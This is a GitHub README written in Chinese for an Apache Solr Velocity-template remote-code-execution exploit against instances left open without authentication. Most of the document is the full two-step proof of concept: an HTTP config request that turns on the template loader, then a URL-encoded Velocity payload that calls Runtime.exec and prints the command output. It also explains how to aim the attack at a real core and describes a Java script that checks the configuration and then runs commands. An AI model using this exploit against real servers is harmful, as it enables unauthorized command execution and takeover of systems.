# Apache_Solr_RCE_via_Velocity
最近Apache Solr爆出了一个RCE 0day漏洞，利用前提是存在未授权访问。原作者给出的POC如下：
```
Apache Solr RCE via Velocity template

Set "params.resource.loader.enabled" as true.

Request:
========================================================================
POST /solr/test/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
========================================================================


RCE via velocity template
Request:
========================================================================
GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: localhost:8983
========================================================================


Response:
========================================================================
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 56

     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
========================================================================
```
实际环境中将test替换为Core Admin中得到的应用路径：  
![](https://github.com/TU-SJ/Apache_Solr_RCE_via_Velocity/blob/master/11-8-1.png)   
本项目是根据POC写出的java利用脚本：    
![](https://github.com/TU-SJ/Apache_Solr_RCE_via_Velocity/blob/master/11-8-2.png)   
先进行配置检测，然后再执行命令
